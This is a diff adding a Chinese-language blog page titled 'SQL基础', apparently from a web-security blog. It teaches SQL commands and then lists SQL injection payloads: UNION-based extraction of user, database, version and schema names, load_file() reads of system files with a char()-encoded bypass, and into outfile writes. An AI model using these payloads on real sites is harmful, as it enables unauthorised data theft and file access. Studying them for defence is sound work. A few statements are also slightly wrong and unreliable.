@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Secer" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL基础">
+<meta property="og:url" content="http://yoursite.com/2018/09/02/SQL基础/index.html">
+<meta property="og:site_name" content="Secer">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/pasted-192.png">
+<meta property="og:updated_time" content="2018-09-02T14:13:40.875Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL基础">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-192.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/02/SQL基础/"/>
+
+
+
+
+
+  <title>SQL基础 | Secer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Secer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/02/SQL基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shiqian">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL基础</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-02T21:52:05+08:00">
+                2018-09-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<p>繁华一场梦</p>
+<p><img src="\images\pasted-192.png" alt="upload successful"></p>
+<h1 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述"></a>SQL概述</h1><h4 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL"></a>什么是SQL</h4><p>(Structured Query Language)简称SQL。是一种特殊目的的编程语言，是一种结构化查询语言与数据库进行交互的程序设计语言</p>
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>用于存取数据以及查询、更新和管理关系型数据库</p>
+<h4 id="数据库的分类"><a href="#数据库的分类" class="headerlink" title="数据库的分类"></a>数据库的分类</h4><h5 id="关系型："><a href="#关系型：" class="headerlink" title="关系型："></a>关系型：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql、Oracle、DB2、sqlserver、Access</span><br></pre></td></tr></table></figure>
+<h5 id="非关系型NOSQL"><a href="#非关系型NOSQL" class="headerlink" title="非关系型NOSQL"></a>非关系型NOSQL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MongDB、Redis、Neo4j</span><br></pre></td></tr></table></figure>
+<p>总的来说，关系型数据库比较安全，非关系型性能好</p>
+<h1 id="SQL命令"><a href="#SQL命令" class="headerlink" title="SQL命令"></a>SQL命令</h1><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h5 id="数据控制语言"><a href="#数据控制语言" class="headerlink" title="数据控制语言"></a>数据控制语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">授权grant</span><br><span class="line">权限收回 remove</span><br><span class="line">数据提交commit</span><br><span class="line">回滚 rollback</span><br></pre></td></tr></table></figure>
+<h5 id="数据定义语言"><a href="#数据定义语言" class="headerlink" title="数据定义语言"></a>数据定义语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create</span><br><span class="line">alter</span><br><span class="line">drop</span><br><span class="line">用于管理库、表</span><br></pre></td></tr></table></figure>
+<h5 id="数据操作语言"><a href="#数据操作语言" class="headerlink" title="数据操作语言"></a>数据操作语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">insert</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">针对表里的数据进行操作</span><br></pre></td></tr></table></figure>
+<h3 id="DCL常用"><a href="#DCL常用" class="headerlink" title="DCL常用"></a>DCL常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">创建用户</span><br><span class="line">CREATE USER username IDENTIFIED BY &apos;password’;</span><br><span class="line">用户授权</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;username&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password’;</span><br><span class="line">撤销授权</span><br><span class="line">revoke all on *.* from username@localhost;</span><br><span class="line"></span><br><span class="line">查看用户的权限</span><br><span class="line">select host,user,password from user;</span><br><span class="line"></span><br><span class="line">删除用户</span><br><span class="line"></span><br><span class="line">DROP USER username;</span><br></pre></td></tr></table></figure>
+<h3 id="DDL常用语句"><a href="#DDL常用语句" class="headerlink" title="DDL常用语句"></a>DDL常用语句</h3><h5 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用命令：</span><br><span class="line">【show databases】 : 查看所有数据库</span><br><span class="line">【use db_name】：进入数据库</span><br><span class="line">【create databse db_name】：创建数据库</span><br><span class="line">【show create database db_name】：显示数据库创建信息</span><br><span class="line">【drop database db_name】：删除数据库</span><br><span class="line">【 show global variables】：显示所有全局变量</span><br><span class="line">常用函数：</span><br><span class="line">【select user()】：显示当前使用连接数据库的用户</span><br><span class="line">【select database()】：显示当前连接的数据库</span><br><span class="line">【select version()】：显示当前数据库的版本</span><br></pre></td></tr></table></figure>
+<h5 id="数据表层面："><a href="#数据表层面：" class="headerlink" title="数据表层面："></a>数据表层面：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">创建表： </span><br><span class="line">CREATE TABLE tablename(</span><br><span class="line">column_name_1 column_type_1 constraints,</span><br><span class="line">column_name_2 column_type_2 constraints,</span><br><span class="line">......</span><br><span class="line">column_name_n column_type_n constraints,</span><br><span class="line">PRIMARY KEY (`column_name_n`),</span><br><span class="line">Index `index_name` (`column_name_n`)</span><br><span class="line">) ENGINE= ENGINE_TYPE DEFAULT CHARSET= CHARSET_TYPE;</span><br><span class="line"></span><br><span class="line">查看表结构： </span><br><span class="line">DESC tablename;</span><br><span class="line">查看创建表的SQL语句</span><br><span class="line">SHOW CREATE TABLE tablename;</span><br><span class="line">删除表：</span><br><span class="line">DROP TABLE tablename;</span><br><span class="line"></span><br><span class="line">修改表字段：</span><br><span class="line">ALTER TABLE tablename MODIFY [COLUMN] column_definition [FIRST | AFTER col_name];</span><br><span class="line">删除表字段：</span><br><span class="line">ALTER TABLE tablename DROP [COLUMN];</span><br><span class="line">增加表字段：</span><br><span class="line">ALTER TABLE tablename ADD [COLUMN] column_definition [FIRST | AFTER col_name];</span><br></pre></td></tr></table></figure>
+<h3 id="DML常用语句"><a href="#DML常用语句" class="headerlink" title="DML常用语句"></a>DML常用语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">插入记录： </span><br><span class="line">INSERT INTO tablename(field1,field2,......fieldn) VALUES(value1,value2,......valuesn);</span><br><span class="line">例：insert into student (student_id,student_name,sex,email,province,city,register_date,createTime,updateTime) values (null,&quot;张三&quot;,&quot;1&quot;,&quot;12345@qq.com&quot;,&quot;北京&quot;,&quot;北京&quot;,current_date(),now(),now());</span><br><span class="line"></span><br><span class="line">更新记录：</span><br><span class="line">UPDATE tablename SET field1=value1,field2=value2,......fieldn=valuen [WHERE CONDITION];</span><br><span class="line"></span><br><span class="line">删除记录：</span><br><span class="line">DELETE FROM tablename [WHERE CONDITION];</span><br><span class="line"></span><br><span class="line">提交/回滚：</span><br><span class="line">在对数据表进行更改操作后、要进行提交（commit）或者回滚（rollback）操作</span><br><span class="line"></span><br><span class="line">查询记录： </span><br><span class="line"></span><br><span class="line">   条件查询：</span><br><span class="line"></span><br><span class="line">SELECT field1… FROM tablename   and (CONDITION2 or CONDITION3);   WHERE CONDITION1  </span><br><span class="line"></span><br><span class="line">  排序和限制：</span><br><span class="line"></span><br><span class="line">SELECT * FROM tablename </span><br><span class="line"></span><br><span class="line">[WHERE CONDITION] </span><br><span class="line"></span><br><span class="line">[ORDER BY field1 [DESC|ASC], field2 [DESC|ASC],...fieldn [DESC|ASC]];</span><br><span class="line"></span><br><span class="line">【DESC】和【ASC】为排序关键字：</span><br><span class="line"></span><br><span class="line">【DESC】表示按照字段进行降序排列（上大-下小）</span><br><span class="line"></span><br><span class="line">【ASC】则表示升序排列（上小-下大）</span><br><span class="line"></span><br><span class="line">默认是按照字段升序进行排列</span><br></pre></td></tr></table></figure>
+<p>SELECT语句中常用的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CONCAT：将多个字符串连接成一个字符串。</span><br><span class="line">CONCAT_WS：是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位  置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是  其它参数。</span><br><span class="line"></span><br><span class="line">GROUP_CONCAT：group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排  序字段] [Separator &apos;分隔符&apos;])</span><br><span class="line"></span><br><span class="line">AVG () ：返回数值列的平均值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">COUNT() ：返回指定列的值的数目（NULL 不计入）。</span><br><span class="line"></span><br><span class="line">MAX()：返回一列中的最大值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">MIN()：返回一列中的最小值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">SUM()：返回数值列的总数（总额）。</span><br><span class="line"></span><br><span class="line">LENGTH()：返回文本字段中值的长度。</span><br><span class="line"></span><br><span class="line">ROUND(column_name,decimals)：用于把数值字段舍入为指定的小数位数。</span><br><span class="line"></span><br><span class="line">FORMAT()：用于对字段的显示进行格式化。</span><br><span class="line"></span><br><span class="line">FIRST()：返回指定的字段中第一个记录的值。</span><br><span class="line"></span><br><span class="line">LAST()：返回指定的字段中最后一个记录的值。</span><br><span class="line"></span><br><span class="line">UCASE () ：把字段的值转换为大写。</span><br><span class="line"></span><br><span class="line">LCASE () ：把字段的值转换为小写。</span><br><span class="line"></span><br><span class="line">DISTINCT : 用于返回唯一不同的值。</span><br></pre></td></tr></table></figure></p>
+<p>表连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。</span><br><span class="line">从大类上分，表连接分为以下4类：</span><br><span class="line"></span><br><span class="line">【内连接】：仅选出两张表中互相匹配的记录</span><br><span class="line">【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录</span><br><span class="line">【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录</span><br><span class="line">【外连接】：两边表中的内容全部显示</span><br></pre></td></tr></table></figure></p>
+<p>联合查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将两个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示出来，这个时候，就需要用到union和union all关键字来实现这样的功能，具体语法如下：</span><br><span class="line">SELECT * FROM t1</span><br><span class="line">UNION|UNION ALL</span><br><span class="line">SELECT * FROM t2</span><br><span class="line">......</span><br><span class="line">UNION|UNION ALL</span><br><span class="line">SELECT * FROM tn;</span><br><span class="line"></span><br><span class="line">UNION 和 UNION ALL的主要区别是 UNION ALL 是把结果集直接合并在一起，而UNION是将UNION ALL后的结果进行一次DISTINCT，去除重复记录后的结果。</span><br></pre></td></tr></table></figure></p>
+<h1 id="SQL安全相关"><a href="#SQL安全相关" class="headerlink" title="SQL安全相关"></a>SQL安全相关</h1><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>mysql_real_escape_string()(PHP)过滤特殊字符串:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这个函数进行字符转义，是为了使数据安全的插入到数据库中而进行过滤</span><br><span class="line">下列字符受影响：</span><br><span class="line">【\x00】：空字符</span><br><span class="line">【\n】：换行</span><br><span class="line">【\r】：回车</span><br><span class="line">【\】：转义字符</span><br><span class="line">【’】：单引号</span><br><span class="line">【“】：双引号</span><br><span class="line">【\x1a】：代替</span><br><span class="line"></span><br><span class="line">注:  \x :指16进制</span><br></pre></td></tr></table></figure></p>
+<p>load_file函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">只有满足两个条件就可以使用： </span><br><span class="line">1、文件权限：chmod a+x pathtofile</span><br><span class="line">2、文件大小: 必须小于max_allowed_packet</span><br><span class="line">在数据库注入中、可以使用该函数去读取相关文件内容</span><br><span class="line"></span><br><span class="line">我们假设一个程序的SQL语句如下：</span><br><span class="line">select * from article where articleid=$id</span><br><span class="line"> (当前条件：magic_quotes_gpc = off, c:/boot.ini可读）</span><br><span class="line">此时，我们构造$id为：-1 union select 1,1,1,1,load_file(&apos;c:/boot.ini’)</span><br><span class="line">查询语句就变成：</span><br><span class="line">select * from article where articleid=-1 union select 1,1,1,1,load_file(&apos;c:/boot.ini’)</span><br><span class="line"></span><br><span class="line">如果 magic_quotes_gpc = on时</span><br><span class="line">我们可以用char()函数或者把字符转换成16进制。</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</span><br><span class="line">char()：获取对应数值的字符、参照ascii码</span><br></pre></td></tr></table></figure></p>
+<p>Into dumpfile()和outfile()函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">只有满足两个条件就可以使用： </span><br><span class="line">首先通过命令 select * from test into outfile &apos;/tmp/test.txt&apos; 来使用outfile导出</span><br><span class="line">得到文件 /tmp/test.txt 文件中保存了所有的数据并且在一行数据的末尾自动换行。</span><br><span class="line"></span><br><span class="line">使用命令 select * from test into dumpfile &apos;/tmp/test.txt&apos; 使用dumpfile进行导出</span><br><span class="line">通过dumpfile导出的数据行数据之间并未进行换行且只导出了部分数据。</span><br><span class="line">dumpfile对文件内容是原意写入，未做任何转移和增加。</span><br></pre></td></tr></table></figure></p>
+<h3 id="注入常用实例"><a href="#注入常用实例" class="headerlink" title="注入常用实例"></a>注入常用实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">永真式：最后加入 or 1=1 来保证无论如何都能获取数据。</span><br><span class="line">错误语句：让Web应用构造错误的SQL语句来抛异常，来判断数据库类型</span><br><span class="line">结束注释：使用注释符注释剩余语句</span><br><span class="line">联合查询：使用union all，后面可以写我要查询的真正语句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1’order by 2 -- /* 用来猜查询信息的列数/</span><br><span class="line">1’and 1=2 union select user(),database(),version(); -- /* 获取数据库信息/</span><br><span class="line">1’and 1=2 union select 1,@@global.version_compile_os from mysql.user -- /*获得操作系统信息</span><br><span class="line">1’and ord(mid(user(),1,1))=114 --  /*测试连接数据库用户权限</span><br><span class="line">1&apos; and 1=2 union select 1,schema_name from information_schema.schemata -- /*爆出所有数据库名称</span><br><span class="line">1&apos; and exists(select * from users) -- /*猜解表名</span><br><span class="line">1&apos; and exists(select first_name from users) -- /猜解字段名</span><br><span class="line">1&apos; and 1=2 union select first_name,last_name from users -- /*猜解字段内容</span><br><span class="line">http://127.0.0.1/day6/1.php?id=1 union select 1,name,pass from admin 数字型</span><br><span class="line">   数字型不用特意加字符，直接 and1=2检测是否有注入点；</span><br><span class="line">Select  1,2,3 ,4   数字代表占位，可以往里放要查询的数据</span><br></pre></td></tr></table></figure>
+<h3 id="判断网站的数据库类型"><a href="#判断网站的数据库类型" class="headerlink" title="判断网站的数据库类型"></a>判断网站的数据库类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.Access一般用在小网站上，类似企业站，功能比较简单，对数据要求不高；</span><br><span class="line"> 2、Mssql是一个比较大的完善的数据库，在windows上常用,配NET ASP等程序。 </span><br><span class="line">3、Mysql是一个小型的公开源代码的免费数据库，在windows，linux上都常用，和PHP程序组成一对完美搭档。</span><br><span class="line">ASP和.NET：Microsoft SQL Server</span><br><span class="line">PHP：MySQL、PostgreSQL</span><br><span class="line">Java：Oracle、MySQL</span><br></pre></td></tr></table></figure>
+      
+    </div>
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>史前感谢您的来访-------------</div>
+    
+</div>
+	
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/02/Python3-7安装scrapy框架/" rel="next" title="Python3.7 安装scrapy框架">
+                <i class="fa fa-chevron-left"></i> Python3.7 安装scrapy框架
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">shiqian</p>
+              <p class="site-description motion-element" itemprop="description">繁华一场梦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
